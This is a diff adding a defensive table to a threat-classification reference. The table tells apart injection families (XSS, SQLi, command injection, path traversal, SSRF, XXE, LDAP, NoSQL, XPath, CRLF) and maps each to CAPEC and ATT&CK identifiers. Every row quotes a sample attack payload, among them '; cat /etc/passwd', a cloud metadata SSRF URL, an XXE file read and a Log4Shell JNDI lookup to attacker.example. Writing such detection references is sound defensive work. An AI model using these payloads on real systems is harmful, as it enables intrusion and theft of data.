@@ -73,3 +73,29 @@ This file is context only and does not provide runtime risk scores.
 | 66 | T1437 | Application Layer Protocol | Telemetry Gap / Evasion | Telemetry Gap / Evasion | Telemetry Gap / Evasion |
 | 67 | T1481 | Web Service | Telemetry Gap / Evasion | Telemetry Gap / Evasion | Telemetry Gap / Evasion |
 | 68 | T1635 | Steal Application Access Token | Session / Token / Workflow Abuse | Session / Token / Workflow Abuse | Session / Token / Workflow Abuse |
+
+## Injection Type Disambiguation Edge Cases
+
+These edge cases address common misclassification between injection families. When the telemetry matches one of these patterns, use the correct classification column.
+
+| # | Observed Pattern | Correct Classification | Common Mistake | Resolution Rule |
+| --- | --- | --- | --- | --- |
+| E1 | `<script>alert(1)</script>` in URL parameter or POST body | XSS: CAPEC-591 (reflected) / T1059.007 | Misclassified as SQLi (CAPEC-66) | HTML/JS tags target browser rendering, not SQL engine. No SQL keywords present → XSS. |
+| E2 | `<img src=x onerror=alert(1)>` in form field | XSS: CAPEC-591 / T1059.007 | Misclassified as SQLi (CAPEC-66) | HTML event handler targets browser DOM. No SQL keywords → XSS. |
+| E3 | `{{7*7}}` or `${7*7}` in request body or URL parameter | SSTI: CAPEC-101 closest CAPEC / T1221 primary | Misclassified as XSS (CAPEC-588) | Template expressions sent to server target template engine, not browser. Default to SSTI unless client-side Angular/Vue is confirmed. |
+| E4 | `' OR 1=1--` in login form or API parameter | SQLi: CAPEC-66 / T1190 | Misclassified as generic injection | SQL boolean operator + comment marker = SQL injection. |
+| E5 | `' UNION SELECT NULL,NULL--` in search parameter | SQLi: CAPEC-7 (blind) or CAPEC-66 / T1190 | Misclassified as XSS or generic | UNION SELECT is SQL-specific syntax. |
+| E6 | `; cat /etc/passwd` or `| whoami` in input field | CMDi: CAPEC-88 / T1059 | Misclassified as SQLi (semicolon `;` is also SQL separator) | After `;` or `|`, check if next token is OS command (cat, whoami, id, ls) → CMDi. If SQL keyword (SELECT, DROP) → SQLi. |
+| E7 | `../../../etc/passwd` in file path parameter | Path Traversal: CAPEC-126 / T1083 | Misclassified as CMDi (contains `/etc/passwd`) | `../` traversal sequences without command execution syntax → Path Traversal, not CMDi. |
+| E8 | `http://169.254.169.254/latest/meta-data` in URL parameter | SSRF: CAPEC-664 / T1190 | Misclassified as generic web attack | URL points to internal cloud metadata endpoint → SSRF. |
+| E9 | `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` in XML body | XXE: CAPEC-201 / T1190 | Misclassified as Path Traversal (contains `/etc/passwd`) | XML DOCTYPE + ENTITY declaration = XXE. The `/etc/passwd` is the entity target, not a traversal path. |
+| E10 | `*)(uid=*))(|(uid=*` in LDAP search/auth field | LDAP Injection: CAPEC-136 / T1190 | Misclassified as SQLi (parentheses + wildcards look SQL-like) | LDAP filter syntax characters `)(`, `*`, `\|` in auth/directory context → LDAP Injection. |
+| E11 | `<script>` + `UNION SELECT` in SAME parameter | XSS primary: CAPEC-63 / T1059.007 | Misclassified as SQLi only | Classify by OUTER wrapper. HTML tags wrapping SQL = XSS payload that happens to contain SQL text. |
+| E12 | `' OR 1=1--` in param A + `<script>` in param B | Report the one that triggered WAF/error as primary | Merged into single wrong classification | Two separate injection attempts in different parameters. Classify each by its own payload content. Report the higher-impact one as primary finding. |
+| E13 | WAF rule name says "SQL Injection" but payload is `<script>alert(1)</script>` | XSS: CAPEC-591 / T1059.007 | Trust WAF label blindly → output SQLi | WAF rules can have generic names. Always verify the actual payload content. Payload has HTML/JS, no SQL → XSS. |
+| E14 | Template error (Jinja2/Twig) in response after `{{config}}` in input | SSTI: CAPEC-101 closest CAPEC / T1221 primary | Misclassified as application error / no threat | Template engine error confirms server processed the template expression. CAPEC-101 is SSI by official name, but is used here as the closest available CAPEC for SSTI; T1221 is the primary identifier. |
+| E15 | `{"username":{"$ne":null},"password":{"$ne":null}}` or `{"$gt":""}` in login/search JSON | NoSQL Injection: CAPEC-676 / T1190 | Misclassified as SQLi because it is query injection | JSON/document query operators (`$ne`, `$gt`, `$where`, `$regex`) target NoSQL query logic, not SQL syntax. |
+| E16 | `${jndi:ldap://attacker.example/a}` in User-Agent or form field | Log4Shell/JNDI lookup: T1190, empty CAPEC when no supported CAPEC fits | Misclassified as SSTI due to `${...}` or LDAP Injection due to `ldap://` | JNDI lookup exploitation is not template rendering and not LDAP filter manipulation. Map technique to T1190 and keep CAPEC empty unless a supported local CAPEC is explicitly required. |
+| E17 | `' or '1'='1` in XPath-backed XML search field or `count(//user)` in XML query parameter | XPath/XQuery Injection: CAPEC-83/84 / T1190 | Misclassified as SQLi or XXE | XML query context plus XPath/XQuery functions/path selectors means XPath/XQuery Injection. XXE requires DOCTYPE/ENTITY behavior. |
+| E18 | `%0d%0aSet-Cookie:%20admin=true` in redirect/header parameter | CRLF / HTTP Header Injection: CAPEC-105 / T1190 | Misclassified as generic URL encoding or XSS | Decode `%0d%0a`; if it creates a new HTTP header or response line, classify as CRLF/Header Injection. |
+| E19 | `%3Cscript%3Ealert(1)%3C/script%3E` or `%27%20OR%201%3D1--` in request input | Decode then classify to original family: XSS or SQLi | Missed as harmless encoding / generic injection | Inspect safely decoded payloads before selecting CAPEC. Encoded XSS remains XSS; encoded SQLi remains SQLi. |
